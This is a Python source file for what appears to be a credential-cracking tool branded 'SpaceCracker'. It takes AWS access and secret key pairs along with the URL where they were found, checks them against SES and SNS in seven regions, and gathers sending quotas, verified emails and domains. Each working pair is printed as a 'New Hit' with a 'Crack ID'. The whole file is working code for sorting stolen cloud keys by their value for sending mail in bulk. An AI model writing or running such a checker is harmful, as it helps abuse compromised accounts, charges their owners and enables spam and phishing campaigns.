import boto3
from typing import Dict, List, Optional
import asyncio
from botocore.exceptions import ClientError, BotoCoreError

class SESValidator:
    def __init__(self):
        self.regions = [
            'us-east-1', 'us-west-2', 'eu-west-1', 'eu-central-1',
            'ap-southeast-1', 'ap-northeast-1', 'sa-east-1'
        ]
        
    async def validate_credentials(self, access_key: str, secret_key: str, source_url: str) -> Dict:
        """Complete AWS SES validation with all regions and services"""
        result = {
            'valid': False,
            'access_level': 'Unknown',
            'regions': {},
            'source_url': source_url,
            'service': 'aws',
            'crack_id': None
        }
        
        # Check access level
        access_level = await self.check_access_level(access_key, secret_key)
        result['access_level'] = access_level
        
        # Check all regions
        for region in self.regions:
            region_data = await self.check_region(access_key, secret_key, region)
            if region_data:
                result['regions'][region] = region_data
                result['valid'] = True
        
        return result
    
    async def check_access_level(self, access_key: str, secret_key: str) -> str:
        """Determine AWS access level"""
        try:
            # Try full SES access
            ses = boto3.client('ses', 
                              aws_access_key_id=access_key,
                              aws_secret_access_key=secret_key,
                              region_name='us-east-1')
            quota = ses.get_send_quota()
            
            # Try SNS
            sns = boto3.client('sns',
                              aws_access_key_id=access_key,
                              aws_secret_access_key=secret_key,
                              region_name='us-east-1')
            topics = sns.list_topics()
            
            return "Full SES + SNS"
            
        except ClientError as e:
            error_code = e.response['Error']['Code']
            if error_code == 'UnauthorizedOperation':
                return "Limited Access"
            elif 'GetSendQuota' in str(e):
                return "SendRawEmail Only"
            return "Invalid Credentials"
        except Exception as e:
            return "Connection Error"
    
    async def check_region(self, access_key: str, secret_key: str, region: str) -> Optional[Dict]:
        """Check specific region capabilities"""
        try:
            ses = boto3.client('ses',
                              aws_access_key_id=access_key,
                              aws_secret_access_key=secret_key,
                              region_name=region)
            
            # Get quota
            quota_response = ses.get_send_quota()
            
            # Get verified emails
            emails_response = ses.list_verified_email_addresses()
            
            # Get verified domains
            try:
                domains_response = ses.list_identities(IdentityType='Domain')
                domains = domains_response.get('Identities', [])
            except:
                domains = []
            
            return {
                'status': 'HEALTHY',
                'quota_max': quota_response.get('Max24HourSend', 0),
                'quota_used': quota_response.get('SentLast24Hours', 0),
                'send_rate': quota_response.get('MaxSendRate', 0),
                'verified_emails': emails_response.get('VerifiedEmailAddresses', []),
                'verified_domains': domains
            }
            
        except ClientError as e:
            # Region might not be available or access denied
            return None
        except Exception:
            return None
    
    def format_output(self, validation_result: Dict, crack_id: str) -> str:
        """Format AWS validation result"""
        access_key = validation_result.get('access_key', 'N/A')
        secret_key = validation_result.get('secret_key', 'N/A')
        
        output = f"""
✨ New Hit (#{crack_id})

👉 USER: {access_key}
👉 PASS: {secret_key}
🔐 ACCESS LEVEL: {validation_result['access_level']}
"""
        
        if validation_result['regions']:
            output += f"\n📊 {len(validation_result['regions'])} regions with access\n"
            
            for region, data in validation_result['regions'].items():
                verified_emails_str = ', '.join(data['verified_emails'][:3]) if data['verified_emails'] else 'None'
                verified_domains_str = ', '.join(data['verified_domains'][:3]) if data['verified_domains'] else 'None'
                
                output += f"""
🌍 {region.upper()}:
🤞 STATUS - {data['status']}
📈 QUOTA - ({data['quota_max']} per day - {data['quota_used']} sent today - {data['send_rate']} mail/s)
✅ VERIFIED EMAILS: {verified_emails_str}
📧 VERIFIED DOMAINS: {verified_domains_str}
"""
        
        output += f"""
🚀 HIT WORKS: {'Yes' if validation_result['valid'] else 'No'}
ℹ️ URL - {validation_result['source_url']}
🆔 Crack ID - #{crack_id}

✨ SpaceCracker.co - @SpaceCracker
"""
        return output